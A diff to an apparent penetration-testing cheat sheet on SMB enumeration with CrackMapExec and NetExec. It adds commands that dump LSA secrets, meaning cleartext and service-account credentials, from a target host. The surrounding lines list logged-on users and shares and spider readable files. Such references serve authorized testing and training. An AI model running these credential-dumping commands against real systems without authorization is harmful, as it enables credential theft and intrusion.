@@ -21,12 +21,21 @@ sudo netexec smb <Target-IP> -u <username> -p <password> --loggedon-users
 sudo crackmapexec smb <Target-IP> -u <username> -p <password> --shares
 sudo netexec smb <Target-IP> -u <username> -p <password> --shares
 ```
+
+#### Dumping LSA secrets
+Get user's cleartext password by attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. 
+```shell
+sudo crackmapexec smb <Target-IP> -u <username> -p <password> --lsa
+sudo netexec smb <Target-IP> -u <username> -p <password> --lsa
+```
+
 #### Spider_plus
 The module spider_plus will dig through each readable share on the host and list all readable files.
 ```shell
 sudo crackmapexec smb <Target-IP> -u <username> -p <password> -M spider_plus --share 'Department Shares'
 sudo netexec smb <Target-IP> -u <username> -p <password> -M spider_plus --share 'Department Shares'
 ```
+
 ---
 
 ## Using SMBMap
